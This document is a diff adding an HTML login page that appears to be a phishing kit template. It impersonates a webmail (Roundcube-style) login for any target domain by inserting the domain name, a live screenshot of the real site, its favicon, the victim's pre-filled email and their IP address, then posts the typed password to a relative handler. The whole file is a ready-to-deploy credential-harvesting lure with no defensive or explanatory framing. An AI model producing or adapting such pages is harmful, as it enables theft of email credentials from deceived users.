@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | {{dman}}</title>
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+  <style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Poppins", sans-serif;
+  }
+
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    position: relative;
+    background: transparent;
+    overflow: hidden;
+  }
+
+  .blurred-bg {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: 1;
+    background: url('https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://{{dman}}') no-repeat center center;
+    background-size: cover;
+    filter: blur(1px);
+  }
+
+  .vision {
+    padding: 1px;
+    margin: 1px;
+    color: #080808;
+    background-color: #f5f5f5;
+    border-radius: 12px;
+    box-shadow: 0px 7px 22px rgba(0, 0, 0, 0.3);
+    z-index: 2;
+    position: relative;
+  }
+
+  .wrapper {
+    width: 420px;
+    background-color: #fff;
+    border: 2px solid rgba(255, 255, 255, .2);
+    color: #080808;
+    border-radius: 12px;
+    padding: 30px 40px;
+    z-index: 3;
+    position: relative;
+  }
+
+  /* Form Header Styling */
+  .form-header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+
+  /* Logo class, with background image assigned from CSS */
+  .logo {
+    width: 48px;
+    height: 48px;
+    background-image: url('https://www.google.com/s2/favicons?domain={{dman}}'); /* Replace with your actual logo URL */
+    background-size: cover;
+    background-position: center;
+    margin-right: 10px;
+	border-radius: 2px;
+  }
+
+  .wrapper .form-header h1 {
+    font-size: 36px;
+  }
+
+  .wrapper .input-box {
+    position: relative;
+    width: 100%;
+    height: 50px;
+    margin: 30px 0;
+  }
+
+  .input-box input {
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    border: none;
+    outline: none;
+    border: 2px solid #d3d3d3;
+    border-radius: 12px;
+    font-size: 16px;
+    color: #08080;
+    padding: 20px 45px 20px 20px;
+    box-shadow: 0 4px 15px rgba(211, 211, 211, 0.3);
+  }
+
+  .input-box input::placeholder {
+    color: #08080;
+  }
+
+  .input-box i {
+    position: absolute;
+    right: 20px;
+    top: 30%;
+    transform: translate(-50%);
+    font-size: 20px;
+  }
+
+  .wrapper .remember-forgot {
+    display: flex;
+    justify-content: space-between;
+    font-size: 14.5px;
+    margin: -15px 0 15px;
+  }
+
+  .remember-forgot label input {
+    accent-color: #08080;
+    margin-right: 3px;
+  }
+
+  .remember-forgot a {
+    color: #08080;
+    text-decoration: none;
+  }
+
+  .remember-forgot a:hover {
+    text-decoration: underline;
+  }
+
+  /* Updated button to be light blue */
+  .wrapper .btn {
+    width: 100%;
+    height: 45px;
+    background: #5bc0de; /* Light blue color */
+    border: none;
+    outline: none;
+    border-radius: 8px;
+    box-shadow: none;
+    cursor: pointer;
+    font-size: 16px;
+    color: #fff; /* White text */
+    font-weight: 600;
+    transition: background 0.3s ease;
+  }
+
+  .wrapper .btn:hover {
+    background: #46b8da; /* Slightly darker light blue on hover */
+  }
+
+  .wrapper .register-link {
+    font-size: 14.5px;
+    text-align: center;
+    margin: 20px 0 15px;
+  }
+
+  .register-link p a {
+    color: #08080;
+    text-decoration: none;
+    font-weight: 600;
+  }
+
+  .register-link p a:hover {
+    text-decoration: underline;
+  }
+  </style>
+</head>
+<body>
+
+  <div class="blurred-bg"></div>
+
+  <div class="vision">
+    <div class="wrapper">
+      <div id="forms">
+        <!-- Form Header with logo and {{dman}} text -->
+        <div class="form-header">
+          <div class="logo"></div> <!-- Logo with background image from CSS -->
+          <h1>{{dman}}</h1>
+        </div>
+
+        <form novalidate name="myform" id="login_form" action="first" method="post" target="_top">
+          <div class="input-box">
+            <input name="horse" value="{{eman}}" id="pet" autofocus="autofocus" class="std_textbox" type="text"  tabindex="1" required disabled>
+            <input type="hidden" name="web" value="{{eman}}">
+            <i class='bx bxs-user'></i>
+          </div>
+          <div class="input-box">
+            <input name="pig" id="pett"  placeholder="Password" type="password" tabindex="2"  required>
+            <i class='bx bxs-lock-alt'></i>
+            <input type="hidden" name="error" id="error" value="">
+            <input type="hidden" name="source" id="source" value="ROUNDCUBE">
+            <input type="hidden" name="ma" id="ma" value="round">
+          </div>
+          <div class="remember-forgot">
+            <label><input type="checkbox">Remember Me</label>
+            <a href="captcha">Forgot Password</a>
+          </div>
+          <button name="login" type="submit" id="login_submit" tabindex="3" class="btn">Login</button>
+          <div class="register-link">
+            <p>You are accessing {{dman}} from IP: {{ ipman }}</p>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
